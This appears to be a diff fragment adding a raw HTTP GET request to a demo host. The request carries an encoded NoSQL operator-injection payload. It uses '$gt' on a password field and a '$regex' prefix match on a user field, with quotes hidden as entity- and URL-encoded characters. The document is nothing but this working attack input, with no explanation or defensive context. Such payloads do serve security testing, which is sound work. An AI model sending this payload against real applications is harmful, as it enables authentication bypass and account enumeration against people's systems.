@@ -1,0 +1,4 @@
+GET /a?id={%26%23x22;password%26%23x22;:{%26%23x22;$gt%26%23x22;:%26%23x22;%26%23x22;},%26%23x22;user%26%23x22;:{%26%23x22;$regex%26%23x22;:%26%23x22;^a%26%23x22;}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
